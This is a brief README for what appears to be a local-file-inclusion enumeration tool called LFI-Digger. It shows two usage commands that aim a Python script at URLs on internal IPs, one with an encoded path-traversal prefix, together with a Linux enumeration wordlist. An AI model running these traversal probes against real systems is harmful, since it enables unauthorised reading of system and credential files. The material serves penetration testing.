# LFI-Digger

Usage example:
<br/>
python lfidigger.py "http://10.17.0.11/lfi_vulnerable.php?lfiparam=%2f..%2f..%2f<b>%LFI%</b>" ./dics/linux_enum.txt
<br/>
python lfidigger.py http://10.17.0.30/page.php?c=<b>%LFI%</b> ./dics/linux_enum.txt
